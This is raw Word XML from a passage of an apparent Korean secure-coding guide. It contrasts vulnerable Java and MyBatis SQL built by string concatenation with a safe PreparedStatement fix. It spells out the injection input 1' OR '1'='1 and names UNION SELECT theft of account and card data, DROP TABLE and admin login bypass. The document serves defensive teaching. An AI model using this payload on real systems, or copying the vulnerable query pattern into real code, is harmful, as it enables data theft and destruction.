        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력값을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>문자열로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>연결</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String sql = "SELECT * FROM board WHERE b_gubun = '" + gubun + "'";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>stmt.executeQuery(sql);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>&lt;!-- [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>] MyBatis: ${}</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>문자열</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>치환</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → SQL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>구조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변경</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>SELECT * FROM board WHERE title LIKE '%${keyword}%'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력값에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 1' OR '1'='1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>넣으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿼리가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SELECT * FROM board WHERE b_gubun = '' OR '1'='1' </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변형되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> WHERE </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조건이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>항상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> TRUE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>결과적으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테이블</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환되며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, UNION SELECT </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>추가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>타</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테이블</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>카드번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>, DROP TABLE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삭제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>우회까지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] PreparedStatement </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파라미터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>바인딩</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String sql = "SELECT * FROM board WHERE b_gubun = ?";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>PreparedStatement pstmt = con.prepareStatement(sql);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>pstmt.setString(1, gubun);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;!-- [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>] MyBatis: #{}</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파라미터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>바인딩</w:t>
            </w:r>
            <w:r>
              <w:rPr>
